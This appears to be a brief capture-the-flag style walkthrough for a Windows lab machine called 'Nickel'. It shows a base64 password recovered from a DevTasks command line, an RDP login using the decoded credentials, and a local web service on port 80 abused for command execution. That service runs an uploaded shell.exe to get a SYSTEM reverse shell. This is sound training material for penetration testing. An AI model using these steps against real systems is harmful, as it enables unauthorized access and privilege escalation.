# Nickel (Windows)

## Initial Foothold

- Referenced the walkthrough: [Nickel - Walkthrough](https://medium.com/@mahdi_78420/nickel-walkthrough-practice-tj-c41e273146bf).
- Used the following command to interact with DevTasks and obtained credentials for the user `ariah` (password was base64-encoded):

    cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

- Decoded the base64 password to retrieve `NowiseSloopTheory139`.
- Connected via RDP using:

    xfreerdp3 /u:ariah /p:'NowiseSloopTheory139' /v:192.168.216.99

- Transferred and cracked a PDF file (via FTP folder or with ariah's credentials) to obtain more information.
- Opened the PDF, found interesting URLs, and tested them.

## Privilege Escalation

- SShed into the machine and found port 80 open locally.
- Using CMD, ran:

    curl http://127.0.0.1/?
    curl http://127.0.0.1/?whoami

- Verified NT AUTHORITY context.
- Uploaded `shell.exe` and executed it with:

    curl http://127.0.0.1/?C:\Users\ariah\shell.exe

- With a listener on port 4444, received a SYSTEM-level reverse shell.
